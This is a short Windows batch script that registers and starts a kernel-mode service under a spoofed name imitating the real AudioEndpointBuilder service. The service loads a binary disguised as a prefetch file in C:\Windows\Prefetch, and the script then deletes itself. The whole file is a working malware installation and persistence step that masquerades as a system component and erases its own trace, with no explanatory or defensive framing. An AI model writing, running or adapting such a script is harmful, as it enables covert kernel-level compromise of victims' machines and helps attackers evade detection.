@echo off
cd %~dp0
sc create AudioEndpointBuilder_7 binpath=C:\Windows\Prefetch\SVCHOST.EXE-H24T175V.pf type=kernel
sc start AudioEndpointBuilder_7
del "%~f0"



